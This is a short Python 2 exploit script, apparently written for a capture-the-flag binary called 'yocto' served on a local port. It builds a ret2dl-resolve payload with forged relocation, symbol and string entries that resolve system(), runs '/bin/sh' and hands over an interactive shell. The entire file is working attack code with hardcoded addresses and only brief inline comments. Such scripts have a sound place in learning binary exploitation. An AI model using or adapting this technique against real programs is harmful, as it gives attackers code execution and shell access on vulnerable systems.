#!/usr/bin/env python2
__author__ = "muhe"
from zio import *

#args = ['./yocto']
args=('127.0.0.1',4444)
io = zio(args, timeout=100000)

plt_addr     = 0x080482a0     # objdump -s -j .plt yocto
rel_plt_addr = 0x08048270     # objdump -s -j .rel.plt yocto
dynsym_addr  = 0x0804818c     # objdump -s -j .dynsym yocto
dynstr_addr  = 0x080481fc     # objdump -s -j .dynstr  yocto
base_addr    = 0x080495C0     # glob
atoi_got_plt = 0x08049548
atoi_plt     = 0x080482e0

# fake reloc  here
fake_reloc_addr = base_addr + 36   # 0x80495e4
reloc_offset = fake_reloc_addr - rel_plt_addr # 0x1374

# fake dynsym here
fake_dynsym_addr = base_addr + 60
align_dynsym = 0x10 - ((fake_dynsym_addr-dynsym_addr) & 0xF)
fake_dynsym_addr += align_dynsym
# const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
r_info = ((fake_dynsym_addr - dynsym_addr)/0x10)<< 8 | 0x7


# fake dynstr here
fake_dynstr_addr = base_addr + 45   # 0x80495ed
st_name = fake_dynstr_addr - dynstr_addr # 0x13f1

#bin_sh_addr = base_addr + 76        # 0x804960c
'''
input: 1111.2222.3333
	push    eax    1111
	push    edx	   2222
	jmp     ecx    3333
call ecx(edx,eax)
'''

payload =  str(atoi_plt)     #eax
payload += '.'
payload += str(reloc_offset) #edx
payload += '.'
payload += str(plt_addr)     #ecx
#raw_input('waiting for debugger attach...')
io.gdb_hint([0x080483F5])

#payload += "AAAA"
#payload += ";cat ./flag\x00"
payload += ";/bin/sh\x00"
payload += "\x90" * (36 - len(payload))
print "$1 --> %d" % (len(payload))
payload += l32(atoi_got_plt) #fake_reloc
payload += l32(r_info)

payload += "\x90"*(45 - len(payload))  # fake_dynstr_addr  string: "system\x00" here
payload += "system\x00"
print "$2 --> %d" % (len(payload))

payload += "\x90" * (60 - len(payload))
payload += "\x90" * align_dynsym
payload += l32(st_name) # fake_dynsym_addr
payload += l32(0)
payload += l32(0)
payload += l32(0x12)

print "$3 --> %d" % (len(payload))

payload += "\x90" * (80 - len(payload))

io.writeline(payload)
io.interact()
